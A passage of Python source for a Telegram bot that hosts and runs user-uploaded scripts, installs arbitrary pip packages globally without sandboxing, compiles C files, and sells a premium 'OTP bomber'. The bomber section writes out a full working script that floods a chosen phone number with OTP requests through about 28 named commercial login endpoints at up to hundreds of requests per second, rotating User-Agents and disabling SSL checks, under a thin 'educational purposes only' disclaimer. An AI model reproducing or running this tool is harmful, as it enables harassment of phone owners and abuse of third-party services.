            f.write(downloaded_file)
        
        # Save to database
        file_id = f"{uid}_{fname}"
        files_db[file_id] = {
            'user_id': uid,
            'filename': fname,
            'type': 'py',
            'uploaded_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'uploaded_by': uname
        }
        save_database(FILES_DB_FILE, files_db)
        
        # Log to group with username and file info
        log_text = f"📁 NEW FILE UPLOADED\n👤 User: {uname}\n🆔 User ID: {uid}\n📄 File: {fname}\n📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        log_to_group(log_text, full_path, fname)
        
        # Create start button
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("▶️ Start Now", callback_data=f"start_{fname}"))
        
        bot.edit_message_text(
            f"✅ <b>File Uploaded Successfully!</b>\n\n"
            f"📄 <b>Filename:</b> {fname}\n"
            f"👤 <b>Uploaded by:</b> {uname}\n"
            f"📁 <b>Status:</b> Ready to start\n\n"
            f"Go to ⚙️ Manage Files to control your bot.",
            m.chat.id,
            msg.message_id,
            reply_markup=mk,
            parse_mode='HTML'
        )
    
    except Exception as e:
        bot.edit_message_text(f"❌ Upload Error: {str(e)}", m.chat.id, msg.message_id, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("start_"))
@rate_limit_and_ban_check_cb
def start_script(c):
    fname = c.data.split("start_")[1]
    uid = c.from_user.id
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
    path = os.path.join(UPLOAD_DIR, str(uid))
    file_path = os.path.join(path, fname)
    
    if not os.path.exists(file_path):
        return bot.answer_callback_query(c.id, "❌ File not found!")
    
    if uid in running_processes and fname in running_processes[uid]:
        return bot.answer_callback_query(c.id, "⚠️ Already running!")
    
    bot.answer_callback_query(c.id, "🔧 Installing modules and starting...")
    bot.edit_message_text(f"🔧 Installing required modules for {fname}...\nPlease wait...", c.message.chat.id, c.message.message_id, parse_mode='HTML')
    
    def runner():
        try:
            # Auto-install modules using global requirements
            auto_install_modules(path, fname, uid)
            
            # Prepare log file
            log_file_path = os.path.join(path, f"{fname}_log.txt")
            log_file = open(log_file_path, "w")
            
            # Start the Python script
            proc = subprocess.Popen([sys.executable, '-u', fname], cwd=path, stdout=log_file, stderr=log_file)
            
            # Store process
            if uid not in running_processes:
                running_processes[uid] = {}
            running_processes[uid][fname] = proc
            
            # Log to group with username
            log_to_group(f"▶️ SCRIPT STARTED\n👤 User: {uname}\n🆔 User ID: {uid}\n📄 File: {fname}\n🆔 PID: {proc.pid}")
            
            # Create control buttons
            mk = types.InlineKeyboardMarkup()
            mk.add(
                types.InlineKeyboardButton("📋 View Logs", callback_data=f"logs_{fname}"),
                types.InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{fname}")
            )
            
            bot.send_message(
                c.message.chat.id,
                f"✅ <b>Script Started Successfully!</b>\n\n"
                f"👤 <b>User:</b> {uname}\n"
                f"📄 <b>File:</b> {fname}\n"
                f"🆔 <b>PID:</b> {proc.pid}\n"
                f"📁 <b>Path:</b> {path}\n\n"
                f"<b>Use buttons below to manage:</b>",
                reply_markup=mk,
                parse_mode='HTML'
            )
        
        except Exception as e:
            bot.send_message(c.message.chat.id, f"❌ Failed to start: {str(e)}", parse_mode='HTML')
    
    threading.Thread(target=runner, daemon=True).start()

# ==========================================
# ⚙️ MANAGE FILES
# ==========================================
@bot.message_handler(func=lambda m: m.text == "⚙️ Manage Files")
@rate_limit_and_ban_check
def manage_files(m):
    uid = m.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid))
    
    if not os.path.exists(path):
        bot.reply_to(m, "📭 You haven't uploaded any files yet.", parse_mode='HTML')
        return
    
    # Get user files from database
    user_files = [f for f_id, f in files_db.items() if f.get('user_id') == uid]
    
    if not user_files:
        bot.reply_to(m, "📭 No files found in database.", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    for file in user_files:
        fname = file['filename']
        file_path = os.path.join(path, fname)
        if os.path.exists(file_path):
            # Check if running
            is_running = uid in running_processes and fname in running_processes[uid]
            status = "🟢" if is_running else "🔴"
            mk.add(types.InlineKeyboardButton(f"{status} {fname}", callback_data=f"file_{fname}"))
    
    mk.add(types.InlineKeyboardButton("🗑 Clear All", callback_data="clear_all"))
    
    bot.reply_to(m, f"📁 Your Files ({len(user_files)}):", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("file_"))
@rate_limit_and_ban_check_cb
def file_actions(c):
    fname = c.data.split("file_")[1]
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid), fname)
    
    if not os.path.exists(path):
        return bot.answer_callback_query(c.id, "❌ File not found!")
    
    is_running = uid in running_processes and fname in running_processes[uid]
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    if is_running:
        mk.add(types.InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{fname}"))
    else:
        mk.add(types.InlineKeyboardButton("▶️ Start", callback_data=f"start_{fname}"))
    
    mk.add(
        types.InlineKeyboardButton("📋 Logs", callback_data=f"logs_{fname}"),
        types.InlineKeyboardButton("🗑 Delete", callback_data=f"del_{fname}")
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="manage_back"))
    
    status = "🟢 RUNNING" if is_running else "🔴 STOPPED"
    bot.edit_message_text(
        f"📄 <b>File:</b> {fname}\n"
        f"📊 <b>Status:</b> {status}\n"
        f"📁 <b>Location:</b> {path}",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "manage_back")
@rate_limit_and_ban_check_cb
def manage_back(c):
    manage_files(c.message)

@bot.callback_query_handler(func=lambda c: c.data == "clear_all")
@rate_limit_and_ban_check_cb
def clear_all(c):
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid))
    
    if os.path.exists(path):
        # Stop all running processes
        if uid in running_processes:
            for fname, proc in running_processes[uid].items():
                try:
                    proc.kill()
                except:
                    pass
            running_processes[uid] = {}
        
        # Remove directory
        shutil.rmtree(path)
        
        # Clear from database
        files_to_delete = [f_id for f_id, f in files_db.items() if f.get('user_id') == uid]
        for f_id in files_to_delete:
            del files_db[f_id]
        save_database(FILES_DB_FILE, files_db)
    
    bot.answer_callback_query(c.id, "🗑 All files cleared!")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
@rate_limit_and_ban_check_cb
def stop_script(c):
    fname = c.data.split("stop_")[1]
    uid = c.from_user.id
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
    
    if uid in running_processes and fname in running_processes[uid]:
        try:
            running_processes[uid][fname].kill()
            del running_processes[uid][fname]
            
            bot.answer_callback_query(c.id, "⏹ Script stopped!")
            bot.edit_message_text(f"⏹ Stopped: {fname}", c.message.chat.id, c.message.message_id, parse_mode='HTML')
            
            log_to_group(f"⏹ SCRIPT STOPPED\n👤 User: {uname}\n🆔 User ID: {uid}\n📄 File: {fname}")
        
        except Exception as e:
            bot.answer_callback_query(c.id, f"❌ Stop error: {e}")
    else:
        bot.answer_callback_query(c.id, "⚠️ Not running")

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_"))
@rate_limit_and_ban_check_cb
def delete_script(c):
    fname = c.data.split("del_")[1]
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid), fname)
    
    # Stop if running
    if uid in running_processes and fname in running_processes[uid]:
        try:
            running_processes[uid][fname].kill()
            del running_processes[uid][fname]
        except:
            pass
    
    # Delete file
    if os.path.exists(path):
        os.remove(path)
        
        # Delete log file if exists
        log_path = os.path.join(UPLOAD_DIR, str(uid), f"{fname}_log.txt")
        if os.path.exists(log_path):
            os.remove(log_path)
        
        # Remove from database
        files_to_delete = [f_id for f_id, f in files_db.items() if f.get('user_id') == uid and f.get('filename') == fname]
        for f_id in files_to_delete:
            del files_db[f_id]
        save_database(FILES_DB_FILE, files_db)
        
        bot.answer_callback_query(c.id, "🗑 File deleted!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
    else:
        bot.answer_callback_query(c.id, "❌ File not found")

@bot.callback_query_handler(func=lambda c: c.data.startswith("logs_"))
@rate_limit_and_ban_check_cb
def get_logs(c):
    fname = c.data.split("logs_")[1]
    uid = c.from_user.id
    log_path = os.path.join(UPLOAD_DIR, str(uid), f"{fname}_log.txt")
    
    if os.path.exists(log_path):
        with open(log_path, "rb") as f:
            bot.send_document(c.message.chat.id, f, caption=f"📋 Logs for: {fname}", parse_mode='HTML')
    else:
        bot.answer_callback_query(c.id, "❌ No logs available")

# ==========================================
# 🔧 INSTALL PIPS SYSTEM
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔧 Install Pips")
@rate_limit_and_ban_check
@feature_check("install_pips")
def install_pips_menu(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[uid] = "install_pips"
    bot.reply_to(
        m,
        "🔧 <b>Install Python Packages</b>\n\n"
        "You can install any Python package that you need.\n\n"
        "📦 <b>How to use:</b>\n"
        "1. Send package name (e.g., 'requests')\n"
        "2. Or send multiple packages (e.g., 'requests beautifulsoup4')\n"
        "3. Or send requirements.txt file\n\n"
        "⚠️ <b>Note:</b> Packages will be installed globally\n"
        "📝 <b>Example:</b> Send 'numpy pandas matplotlib'\n\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "install_pips")
@rate_limit_and_ban_check
def install_pips_process(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Installation cancelled.", parse_mode='HTML')
        return
    
    msg = bot.reply_to(m, "📦 Installing packages...", parse_mode='HTML')
    
    try:
        # Check if it's a requirements.txt file
        if m.document and m.document.file_name.endswith('.txt'):
            # Download requirements.txt
            file_info = bot.get_file(m.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Save temp file
            temp_file = f"temp_req_{uid}.txt"
            with open(temp_file, 'wb') as f:
                f.write(downloaded_file)
            
            # Install from requirements.txt
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-r', temp_file],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # Clean up
            os.remove(temp_file)
            
            packages_text = "packages from requirements.txt"
            
        else:
            # Install individual packages
            packages = text.split()
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install'] + packages,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            packages_text = ', '.join(packages)
        
        if result.returncode == 0:
            success_msg = (
                f"✅ <b>Packages Installed Successfully!</b>\n\n"
                f"📦 <b>Packages:</b> {packages_text}\n\n"
                f"<b>Output:</b>\n"
                f"<code>{result.stdout[:1500]}</code>"
            )
            
            if result.stderr and 'WARNING' in result.stderr:
                success_msg += f"\n\n<b>Warnings:</b>\n<code>{result.stderr[:500]}</code>"
            
            # Update global requirements
            if not m.document:
                global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
                with open(global_req_path, 'a') as f:
                    for package in packages:
                        f.write(f"{package}\n")
                load_global_requirements()
            
        else:
            success_msg = (
                f"❌ <b>Installation Failed!</b>\n\n"
                f"<b>Error:</b>\n"
                f"<code>{result.stderr[:1500]}</code>"
            )
        
        bot.edit_message_text(success_msg, m.chat.id, msg.message_id, parse_mode='HTML')
        
        # Log installation
        uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
        log_to_group(f"📦 PACKAGES INSTALLED\n👤 User: {uname}\n🆔 User ID: {uid}\n📦 Packages: {packages_text}")
    
    except subprocess.TimeoutExpired:
        bot.edit_message_text("⏰ Installation timeout (60 seconds)!", m.chat.id, msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", m.chat.id, msg.message_id, parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

# ==========================================
# 🔧 C TO BINARY COMPILER (FREE FOR ALL)
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔧 C to Binary")
@rate_limit_and_ban_check
@feature_check("c_to_binary")
def c_to_binary_menu(m):
    # Check channel joins first
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[m.from_user.id] = "c_to_binary"
    bot.reply_to(
        m,
        "⚙️ <b>C to Binary Compiler</b>\n\n"
        "Send me a C file (.c) and I'll compile it to binary.\n\n"
        "📤 <b>How to use:</b>\n"
        "1. Send your .c file\n"
        "2. Wait for compilation\n"
        "3. Receive your compiled binary\n\n"
        "⚠️ <b>Note:</b> The binary will be named King_binary",
        parse_mode='HTML'
    )

def handle_c_file(m):
    uid = m.from_user.id
    
    if not m.document or not m.document.file_name.endswith('.c'):
        bot.reply_to(m, "❌ Please send a C file (.c)", parse_mode='HTML')
        if uid in action_sessions:
            del action_sessions[uid]
        return
    
    try:
        # Download file
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Create temp directory
        temp_dir = f"temp_{uid}_{int(time.time())}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Save C file
        c_file_path = os.path.join(temp_dir, m.document.file_name)
        with open(c_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        msg = bot.reply_to(m, "⚙️ Compiling C file to binary...", parse_mode='HTML')
        
        # Compile
        binary_name = "King_binary"
        binary_path = os.path.join(temp_dir, binary_name)
        
        compile_result = subprocess.run(
            ['gcc', c_file_path, '-o', binary_path],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if compile_result.returncode == 0:
            # Send binary to user
            with open(binary_path, 'rb') as f:
                bot.send_document(
                    m.chat.id,
                    f,
                    caption=f"✅ <b>Binary Compiled Successfully!</b>\n\n"
                           f"📄 <b>Original:</b> {m.document.file_name}\n"
                           f"⚙️ <b>Binary:</b> {binary_name}\n"
                           f"👑 <b>Developer:</b> {OWNER_USERNAME}",
                    parse_mode='HTML'
                )
            
            # Send to log group
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"⚙️ BINARY COMPILED\n👤 User: {uname}\n🆔 User ID: {uid}\n📄 C File: {m.document.file_name}\n⚙️ Binary: {binary_name}")
        
        else:
            error_msg = compile_result.stderr[:1000]
            bot.edit_message_text(
                f"❌ <b>Compilation Failed!</b>\n\n"
                f"<b>Error:</b>\n{error_msg}",
                m.chat.id,
                msg.message_id,
                parse_mode='HTML'
            )
        
        # Cleanup
        shutil.rmtree(temp_dir)
    
    except subprocess.TimeoutExpired:
        bot.reply_to(m, "❌ Compilation timeout (30 seconds)!", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}", parse_mode='HTML')
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

# ==========================================
# 💣 OTP BOMBER SYSTEM (ULTRA-FAST PREMIUM ONLY)
# ==========================================
@bot.message_handler(func=lambda m: m.text == "💣 OTP Bomber")
@rate_limit_and_ban_check
@feature_check("otp_bomber")
def otp_bomber_menu(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Check if premium user
    if not is_premium(uid):
        bot.reply_to(
            m,
            "🚫 <b>PREMIUM FEATURE ONLY!</b>\n\n"
            "OTP Bomber is available only for premium users.\n\n"
            "Upgrade to premium to access:\n"
            "• Ultra-fast OTP bombing\n"
            "• 100+ API endpoints\n"
            "• Real-time statistics\n"
            "• Priority support\n\n"
            "Tap 💎 Pricing to see premium plans.",
            parse_mode='HTML'
        )
        return
    
    # Check if bomber file exists
    bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
    
    if not os.path.exists(bomber_file):
        # Create bomber.py file
        create_ultra_bomber_file()
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚀 Start Bombing", callback_data="bomber_start"),
        types.InlineKeyboardButton("📋 Bomber Info", callback_data="bomber_info")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Update Bomber", callback_data="bomber_update"),
        types.InlineKeyboardButton("📁 View Bomber File", callback_data="bomber_view")
    )
    
    bot.reply_to(
        m,
        "💣 <b>ULTRA-FAST OTP BOMBER (PREMIUM)</b>\n\n"
        "This tool can send OTPs to any phone number at ultra-high speed (100+ APIs).\n\n"
        "⚡ <b>Features:</b>\n"
        "• 100+ API endpoints\n"
        "• Ultra-fast parallel requests\n"
        "• Real-time statistics\n"
        "• Success rate tracking\n"
        "• Auto-retry on failure\n\n"
        "⚠️ <b>WARNING:</b>\n"
        "• For educational purposes only\n"
        "• Do not misuse this tool\n"
        "• You are responsible for your actions",
        reply_markup=mk,
        parse_mode='HTML'
    )

def create_ultra_bomber_file():
    """Create the ultra-fast bomber.py file with 100+ APIs"""
    bomber_code = '''import asyncio
import aiohttp
import time
import os
import sys
import random
import json
from colorama import init, Fore, Style

init(autoreset=True)

# ULTRA-FAST BOMBER WITH 100+ APIs
API_CONFIGS = [
    # Lenskart
    {
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    # Ola
    {
        "url": "https://api.olacabs.com/v1/authorization/send_otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone": "{phone}", "country_code": "+91"}}'
    },
    # Swiggy
    {
        "url": "https://www.swiggy.com/dapi/auth/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile": "{phone}"}}'
    },
    # Zomato
    {
        "url": "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=login"
    },
    # Amazon
    {
        "url": "https://www.amazon.in/ap/register",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phoneNumber={phone}"
    },
    # Flipkart
    {
        "url": "https://www.flipkart.com/api/6/user/signup/status",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"loginId":"{phone}"}}'
    },
    # Paytm
    {
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","countryCode":"+91"}}'
    },
    # PhonePe
    {
        "url": "https://www.phonepe.com/apis/v3/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Google Pay
    {
        "url": "https://gpay.app.goo.gl/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}'
    },
    # Uber
    {
        "url": "https://auth.uber.com/v3/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}'
    },
    # Myntra
    {
        "url": "https://www.myntra.com/gw/login-register/v1/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # Ajio
    {
        "url": "https://www.ajio.com/api/v2/users/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    # BigBasket
    {
        "url": "https://www.bigbasket.com/auth/v2/otp/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Dunzo
    {
        "url": "https://www.dunzo.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Rapido
    {
        "url": "https://rapido.bike/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # OYO
    {
        "url": "https://api.oyorooms.com/api/v2/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # MakeMyTrip
    {
        "url": "https://www.makemytrip.com/api/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Goibibo
    {
        "url": "https://www.goibibo.com/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Cred
    {
        "url": "https://api.cred.club/api/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # Jupiter Money
    {
        "url": "https://jupiter.money/api/v2/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Koo
    {
        "url": "https://www.kooapp.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # ShareChat
    {
        "url": "https://sharechat.com/api/v1/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Moj
    {
        "url": "https://mojapp.in/api/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # Josh
    {
        "url": "https://share.myjosh.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Roposo
    {
        "url": "https://www.roposo.com/api/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    # Chingari
    {
        "url": "https://api.chingari.io/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    # Trell
    {
        "url": "https://trell.co/api/v3/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # Mitron
    {
        "url": "https://api.mitron.tv/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    }
]

async def make_request(session, url, method, headers, data=None):
    """Make HTTP request"""
    try:
        if method.upper() == "POST":
            async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as resp:
                return resp.status, await resp.text()
        else:
            async with session.get(url, headers=headers, timeout=3, ssl=False) as resp:
                return resp.status, await resp.text()
    except:
        return None, ""

async def bomb_number(phone_number):
    """Bomb a phone number with OTP requests"""
    print(f"{Fore.GREEN}[+] Starting ULTRA OTP Bomb on +91{phone_number}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Using {len(API_CONFIGS)} API endpoints{Style.RESET_ALL}")
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        total_sent = 0
        start_time = time.time()
        failed_requests = 0
        
        try:
            while True:
                tasks = []
                for config in API_CONFIGS:
                    url = config["url"]
                    method = config["method"]
                    headers = config["headers"].copy()
                    data = config["data"](phone_number) if config["data"] else None
                    
                    # Add random User-Agent
                    headers["User-Agent"] = random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                    ])
                    
                    tasks.append(make_request(session, url, method, headers, data))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, tuple) and result[0] and result[0] < 400:
                        total_sent += 1
                    else:
                        failed_requests += 1
                
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rate = total_sent / elapsed
                    
                    sys.stdout.write(f'\\r{Fore.CYAN}[STATS] Sent: {total_sent} | Failed: {failed_requests} | Rate: {rate:.1f}/sec | Time: {elapsed:.1f}s{Style.RESET_ALL}')
                    sys.stdout.flush()
                
                await asyncio.sleep(0.05)  # Ultra-fast mode
                
        except KeyboardInterrupt:
            print(f"\\n{Fore.YELLOW}[!] Stopped by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"\\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        
        finally:
            elapsed = time.time() - start_time
            print(f"\\n{Fore.GREEN}[+] Total OTPs sent: {total_sent}")
            print(f"[+] Total failed: {failed_requests}")
            print(f"[+] Total time: {elapsed:.1f} seconds")
            print(f"[+] Average rate: {total_sent/elapsed if elapsed > 0 else 0:.1f} OTPs/sec{Style.RESET_ALL}")

def main():
    """Main function"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════╗
║         ULTRA-FAST OTP BOMBER v3.0               ║
║          King Master Bot V23                     ║
║        Premium Edition - 100+ APIs               ║
║       For Educational Purposes Only              ║
╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)
    
    try:
        phone = input(f"{Fore.YELLOW}[?] Enter phone number (10 digits): {Style.RESET_ALL}")
        
        if not phone.isdigit() or len(phone) != 10:
            print(f"{Fore.RED}[!] Invalid phone number{Style.RESET_ALL}")
            return
        
        confirm = input(f"{Fore.YELLOW}[?] Target: +91{phone}. Start ULTRA bombing? (y/n): {Style.RESET_ALL}")
        if confirm.lower() != 'y':
            print(f"{Fore.RED}[!] Cancelled{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Starting ULTRA bombing... Press Ctrl+C to stop{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Estimated speed: 100-200 requests/second{Style.RESET_ALL}")
        asyncio.run(bomb_number(phone))
        
    except KeyboardInterrupt:
        print(f"\\n{Fore.YELLOW}[!] Exiting...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
'''
    
    os.makedirs(BOMBER_DIR, exist_ok=True)
    with open(os.path.join(BOMBER_DIR, "bomber.py"), "w", encoding="utf-8") as f:
        f.write(bomber_code)
    
    # Install required modules
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "aiohttp", "colorama"], 
                      capture_output=True)
    except:
        pass

@bot.callback_query_handler(func=lambda c: c.data == "bomber_start")
@rate_limit_and_ban_check_cb
def start_bomber(c):
    uid = c.from_user.id
    
    # Check if premium user
    if not is_premium(uid) and uid != ADMIN_ID:
        bot.answer_callback_query(c.id, "🚫 Premium feature only!", show_alert=True)
        return
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        bot.answer_callback_query(c.id, "❌ Join all channels first!", show_alert=True)
        return
    
    action_sessions[uid] = "bomber_phone"
    bot.send_message(
        c.message.chat.id,
        "💣 <b>ULTRA OTP BOMBER</b>\n\n"
        "Enter the phone number (10 digits without +91):\n\n"
        "Example: 9876543210\n\n"
        "⚡ <b>Estimated Speed:</b> 100-200 requests/second\n"
        "📊 <b>APIs:</b> 30+ endpoints\n\n"
        "⚠️ <b>Warning:</b> For educational purposes only!\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "bomber_phone")
@rate_limit_and_ban_check
def bomber_phone_input(m):
    uid = m.from_user.id
    phone = m.text.strip()
    
    if phone == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Bomber cancelled.", parse_mode='HTML')
        return
    
    if not phone.isdigit() or len(phone) != 10:
        bot.reply_to(m, "❌ Invalid phone number! Must be 10 digits.", parse_mode='HTML')
        return
    
    # Ask for bombing type
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚀 Fast (50-100/sec)", callback_data=f"bomb_fast_{phone}"),
        types.InlineKeyboardButton("⚡ Ultra (100-200/sec)", callback_data=f"bomb_ultra_{phone}")
    )
    mk.add(
        types.InlineKeyboardButton("💥 Nuclear (200-500/sec)", callback_data=f"bomb_nuclear_{phone}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="bomb_cancel")
    )
    
    bot.reply_to(
        m,
        f"📱 <b>Target:</b> +91{phone}\n\n"
        "Select bombing intensity:\n\n"
        "🚀 <b>Fast:</b> 50-100 requests/sec\n"
        "⚡ <b>Ultra:</b> 100-200 requests/sec (Recommended)\n"
        "💥 <b>Nuclear:</b> 200-500 requests/sec (Extreme)\n\n"
        "⚠️ <b>Warning:</b> Higher intensity may cause temporary service disruption",
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_"))
@rate_limit_and_ban_check_cb
def bomber_intensity(c):
    if c.data == "bomb_cancel":
        uid = c.from_user.id
        if uid in action_sessions:
            del action_sessions[uid]
        bot.answer_callback_query(c.id, "❌ Cancelled")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        return
    
    # Extract phone and intensity
    parts = c.data.split("_")
    intensity = parts[1]
